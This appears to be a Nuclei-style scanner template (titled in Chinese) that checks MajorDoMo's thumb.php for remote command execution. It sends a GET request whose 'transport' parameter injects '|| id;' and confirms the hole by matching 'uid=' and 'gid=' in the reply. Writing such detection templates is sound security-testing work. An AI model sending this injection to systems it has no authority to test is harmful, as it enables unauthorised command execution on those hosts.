id: MajorDoMo-thumb_php-RCE

info:
  name: 智能家居平台 MajorDoMo thumb.php 远程命令执行漏洞
  author: MajorDoMo
  severity: high
  tags: RCE

http:
  - raw:
      - |
        GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+id%3B HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
        condition: and
      - type: status
        status: 
          - 200